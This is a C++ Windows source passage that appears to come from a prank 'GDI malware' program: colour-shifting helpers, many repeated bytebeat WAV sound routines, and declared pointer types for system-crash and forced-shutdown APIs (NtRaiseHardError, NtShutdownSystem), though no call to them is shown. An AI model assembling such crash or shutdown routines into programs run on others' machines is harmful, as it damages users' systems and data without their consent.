typedef struct IUnknown IUnknown;
#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <math.h>
#include <cstdint>
#include <cstdlib>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef ULONG32(NTAPI* lpNtShutdownSystem)(int Action);
typedef ULONG32(NTAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);

static ULONGLONG n, v;
int randy() { return n = v, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, v = n, n & 0x7fffffff; }

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{


	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 3.f;
		FLOAT _g = (FLOAT)g / 5.f;
		FLOAT _b = (FLOAT)b / 5.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 23.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .35f) ? (l * (31.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 30.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 36.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 15.f);
		rgb.rgbGreen = (BYTE)(g * 53.f);
		rgb.rgbBlue = (BYTE)(b * 3.f);

		return rgb;
	}
}

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the Hue function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}

void sound1(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			((t >> 8 & t >> (9 + (3 & t >> 11)) | t) * t)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound2(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(((t * (1 + (42 & t >> 10)) % 25 * (1 - t % 2048 / 3000)) * t) >> 10) - t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound3(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			((t >> 4) * (t >> 3) | t >> (8 + (1 & t >> 11))) * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound4(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			101 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)) - t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound5(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			((t & t + t / 656) - t * (t >> 6635) & 464)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound6(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * ((t >> 9 & t >> (5 + (3 & t >> 10))) & t)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound7(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t * (t >> 7 & ((t / 100) % 29)) - (t * 10)) & (t * (t >> 5 & t >> 7))
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound8(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			((t * (4 | t >> 13 & 3) >> (t >> 11 & 1)) ^ (t * (t >> 11 & t >> 13) * (t >> 9 & 3))) & 128
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound9(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(((t & t >> 12) | (t >> 10 | t >> 9)) ^ t) * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound10(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t >> 3) * (t >> 10 | t >> (7 & t >> 12))
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound11(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			((((~t >> 2) * ((127 & t * (7 & t >> 10)) < (245 & t * (200 + (51 & t >> 7))))) & 255) * t) >> 4
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound12(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(5 * (t >> 7 | 3 * t | t >> 6)) * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound13(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t >> 5 | t << 4 | t & 1023 ^ 1981 | t - 67 >> 4) * t * 101
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound14(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t >> (t & 7) | t << (t & 42) | t >> 7 | t << 5) * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound15(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(9 * t & t >> 4 | 5 * t & t >> 7 | 3 * t & t >> 10) + (300000 / (1 + (t % 4096)))
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound16(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t >> 13 | t >> 8 ^ t) >> 10
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound17(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(((t * ((t >> 10 | t % 16 * t >> 5) & 8 * t >> 10 & 18)) - t) * t) >> 5
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound18(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t >> 10 | ((t * t) >> 14)) * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
